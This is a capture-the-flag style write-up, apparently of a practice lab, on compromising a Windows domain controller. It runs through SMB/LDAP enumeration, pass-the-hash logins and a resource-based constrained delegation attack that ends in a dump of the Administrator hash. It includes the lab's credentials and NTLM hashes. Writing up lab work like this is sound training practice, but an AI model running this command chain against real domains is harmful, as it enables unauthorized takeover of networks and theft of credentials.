#### ***Enumeration***

```
nxc smb 192.168.210.175 

SMB         192.168.210.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
```

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -n -p- -T4 --open -Pn 192.168.210.175 -oN  Resourced-nmap


```


![qry](Pasted%20image%2020260111200921.png)

```
ldapdomaindump -u 'resourced.local\V.Ventz' -p 'HotelCalifornia194!' resourced.local
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

```


![domdump](Pasted%20image%2020260111223244.png)
```

nxc smb 192.168.210.175 -u users -p passw
```


![nxc-vnt](Pasted%20image%2020260111201540.png)

```
smbclient  -L \\\\192.168.210.175\\ -U 'V.Ventz%HotelCalifornia194!'
```

![smb](Pasted%20image%2020260111201928.png)

![audit](Pasted%20image%2020260111202103.png)

![](Pasted%20image%2020260111215027.png)




---

#### ***Initial Access***

![imp-dump](Pasted%20image%2020260111220044.png)

```
evil-winrm -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808' -i 192.168.115.175
```

![lstone](Pasted%20image%2020260111224027.png)






---

#### ***Privilege Escalation***

```
bloodhound-python  -ns 192.168.115.175 -d resourced.local -u L.Livingstone --hashes 'aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808' -c all
```


![bhp](Pasted%20image%2020260111225736.png)

![graph](Pasted%20image%2020260111231311.png)

The user L.LIVINGSTONE@RESOURCED.LOCAL has GenericAll permissions to the computer RESOURCEDC.RESOURCED.LOCAL.

This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.

```
impacket-addcomputer resourced.local/L.LIVINGSTONE -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808 -dc-ip 192.168.115.175 -computer-name 'adminew' -computer-pass 'Loginadmin'
```

![](Pasted%20image%2020260111235330.png)

```
 python3 rbcd.py -dc-ip 192.168.115.175 -t resourcedc -f 'adminew' -hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
```

![](Pasted%20image%2020260111235357.png)

```
impacket-getST -spn 'cifs/resourcedc.resourced.local' resourced/adminew$:'Loginadmin' -impersonate  Administrator -dc-ip 192.168.115.175
```

![get_ST](Pasted%20image%2020260112002059.png)

```
 export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

```
impacket-secretsdump -k -no-pass resourcedc.resourced.local

```

![admn-hash](Pasted%20image%2020260112003514.png)

```
evil-winrm -u Administrator -H 8e0efd059433841f73d171c69afdda7c -i 192.168.115.175
```

![DC-admin](Pasted%20image%2020260112003859.png)

---

										Target compromised - |^| ^ ( |< 3 D

